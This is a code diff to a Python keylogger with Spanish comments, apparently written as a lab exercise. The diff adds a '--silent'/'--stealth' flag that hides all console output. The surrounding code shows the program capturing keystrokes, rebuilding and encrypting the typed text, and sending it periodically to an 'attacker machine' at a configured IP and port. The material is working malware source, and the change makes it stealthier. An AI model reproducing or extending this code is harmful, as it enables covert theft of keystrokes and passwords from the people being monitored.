@@ -78,7 +78,7 @@ class UnifiedKeylogger:
 
     """
     
-    def __init__(self, reconstruction_interval=5, enable_encryption=True, send_interval=30, target_ip="192.168.1.100", target_port=8080):
+    def __init__(self, reconstruction_interval=5, enable_encryption=True, send_interval=30, target_ip="192.168.1.100", target_port=8080, silent_mode=False):
         # configuración básica de archivos
         self.script_dir = os.path.dirname(os.path.abspath(__file__))
         self.log_file = os.path.join(self.script_dir, "key_log.txt")
@@ -100,6 +100,9 @@ class UnifiedKeylogger:
         self.target_port = target_port  # puerto donde escucha tu servidor
         self.target_url = f"http://{target_ip}:{target_port}/receive_data"
         
+        # modo silencioso
+        self.silent_mode = silent_mode
+        
         # control de hilos
         self.running = False
         self.reconstruction_thread = None
@@ -113,16 +116,17 @@ class UnifiedKeylogger:
         self.encryptions_done = 0
         self.sends_done = 0
         
-        print(f"🎯 keylogger unificado iniciado")
-        print(f"📁 archivos:")
-        print(f"   - log: {self.log_file}")
-        print(f"   - texto: {self.output_file}")
-        if self.enable_encryption:
-            print(f"   - cifrado: {self.encrypted_file}")
-        print(f"⏱️  reconstrucción cada {reconstruction_interval} segundos")
-        print(f"🔐 cifrado: {'activado' if self.enable_encryption else 'desactivado'}")
-        print(f"📡 envío a {self.target_url} cada {send_interval} segundos")
-        print(f"🚨 presiona ctrl+c para detener\n")
+        if not self.silent_mode:
+            print(f"🎯 keylogger unificado iniciado")
+            print(f"📁 archivos:")
+            print(f"   - log: {self.log_file}")
+            print(f"   - texto: {self.output_file}")
+            if self.enable_encryption:
+                print(f"   - cifrado: {self.encrypted_file}")
+            print(f"⏱️  reconstrucción cada {reconstruction_interval} segundos")
+            print(f"🔐 cifrado: {'activado' if self.enable_encryption else 'desactivado'}")
+            print(f"📡 envío a {self.target_url} cada {send_interval} segundos")
+            print(f"🚨 presiona ctrl+c para detener\n")
     
     def keyPressed(self, key):
         # capturar tecla presionada sin mostrar en pantalla
@@ -312,18 +316,19 @@ class UnifiedKeylogger:
             except Exception as e:
                 pass
         
-        print(f"📊 RESUMEN FINAL:")
-        print(f"   - Teclas capturadas: {self.keys_captured}")
-        print(f"   - Reconstrucciones: {self.reconstructions_done}")
-        if self.enable_encryption:
-            print(f"   - Cifrados: {self.encryptions_done}")
-        
-        file_list = [self.log_file, self.output_file]
-        if self.enable_encryption:
-            file_list.append(self.encrypted_file)
-        
-        print(f"   - Archivos generados: {', '.join([os.path.basename(f) for f in file_list])}")
-        print("👋 ¡Keylogger detenido!")
+        if not self.silent_mode:
+            print(f"📊 RESUMEN FINAL:")
+            print(f"   - Teclas capturadas: {self.keys_captured}")
+            print(f"   - Reconstrucciones: {self.reconstructions_done}")
+            if self.enable_encryption:
+                print(f"   - Cifrados: {self.encryptions_done}")
+            
+            file_list = [self.log_file, self.output_file]
+            if self.enable_encryption:
+                file_list.append(self.encrypted_file)
+            
+            print(f"   - Archivos generados: {', '.join([os.path.basename(f) for f in file_list])}")
+            print("👋 ¡Keylogger detenido!")
     
     def clear_previous_logs(self):
         # limpiar archivos de sesiones anteriores
@@ -340,17 +345,22 @@ def main():
     """
     función principal - aquí empieza todo
     """
-    print("=" * 60)
-    print("🚀 KEYLOGGER UNIFICADO EN TIEMPO REAL")
-    print("=" * 60)
-    print("✨ Características:")
-    print("   - Captura teclas en tiempo real")
-    print("   - Reconstruye texto automáticamente")
-    print("   - Cifra el texto dinámicamente 🔐")
-    print("   - Maneja backspaces correctamente")
-    print("   - Muestra estadísticas en vivo")
-    print("   - Envía datos cifrados a máquina atacante 📡")
-    print("=" * 60)
+    # detectar si se quiere modo silencioso
+    import sys
+    silent_mode = '--silent' in sys.argv or '--stealth' in sys.argv
+    
+    if not silent_mode:
+        print("=" * 60)
+        print("🚀 KEYLOGGER UNIFICADO EN TIEMPO REAL")
+        print("=" * 60)
+        print("✨ Características:")
+        print("   - Captura teclas en tiempo real")
+        print("   - Reconstruye texto automáticamente")
+        print("   - Cifra el texto dinámicamente 🔐")
+        print("   - Maneja backspaces correctamente")
+        print("   - Muestra estadísticas en vivo")
+        print("   - Envía datos cifrados a máquina atacante 📡")
+        print("=" * 60)
     
     # configuración del laboratorio
     RECONSTRUCTION_INTERVAL = 3  # cada 3 segundos reconstruye texto
@@ -359,18 +369,20 @@ def main():
     TARGET_IP = "10.0.2.15"     # ip de tu máquina atacante
     TARGET_PORT = 8080          # puerto del servidor receptor
     
-    print(f"🎯 Configuración del laboratorio:")
-    print(f"   - Máquina atacante: {TARGET_IP}:{TARGET_PORT}")
-    print(f"   - Intervalo de envío: {SEND_INTERVAL}s")
-    print(f"   - Intervalo de reconstrucción: {RECONSTRUCTION_INTERVAL}s")
-    print("=" * 60)
+    if not silent_mode:
+        print(f"🎯 Configuración del laboratorio:")
+        print(f"   - Máquina atacante: {TARGET_IP}:{TARGET_PORT}")
+        print(f"   - Intervalo de envío: {SEND_INTERVAL}s")
+        print(f"   - Intervalo de reconstrucción: {RECONSTRUCTION_INTERVAL}s")
+        print("=" * 60)
 
     keylogger = UnifiedKeylogger(
         reconstruction_interval=RECONSTRUCTION_INTERVAL,
         enable_encryption=ENABLE_ENCRYPTION,
         send_interval=SEND_INTERVAL,
         target_ip=TARGET_IP,
-        target_port=TARGET_PORT
+        target_port=TARGET_PORT,
+        silent_mode=silent_mode
     )
     keylogger.start()
 
